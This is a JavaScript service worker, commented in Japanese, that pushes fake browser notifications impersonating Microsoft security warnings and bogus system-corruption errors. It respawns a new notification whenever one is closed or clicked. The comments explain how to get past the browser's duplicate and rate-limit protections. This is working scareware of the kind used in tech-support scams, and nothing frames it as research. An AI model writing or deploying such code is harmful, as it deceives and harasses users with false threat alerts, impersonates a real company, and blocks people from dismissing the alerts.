// 次の1つを出す関数
function spawn(registration) {
    const isIcon = Math.random() > 0.5;
    registration.showNotification(isIcon ? "⚠ Microsoft警告" : "SYSTEM ERROR", {
        body: isIcon ? "脅威を検出しました。直ちに駆除が必要です。" : "システムデータ破損: 0x800410",
        icon: "https://img.icons8.com/color/96/microsoft.png",
        // tagをあえて外すことで、新しい通知として認識させやすくします
        requireInteraction: true 
    });
}

// 最初の起動命令
self.addEventListener('message', (event) => {
    if (event.data === 'start') {
        spawn(self.registration);
    }
});

// ❌マークやスワイプで消された時に補充
self.addEventListener('notificationclose', (event) => {
    // 0.2秒だけ待ってから出すと、ブラウザの連続動作制限に引っかかりにくいです
    setTimeout(() => {
        spawn(self.registration);
    }, 200);
});

// 通知そのものをクリックした時も補充
self.addEventListener('notificationclick', (event) => {
    event.notification.close(); // 通知を閉じる
    spawn(self.registration);
});
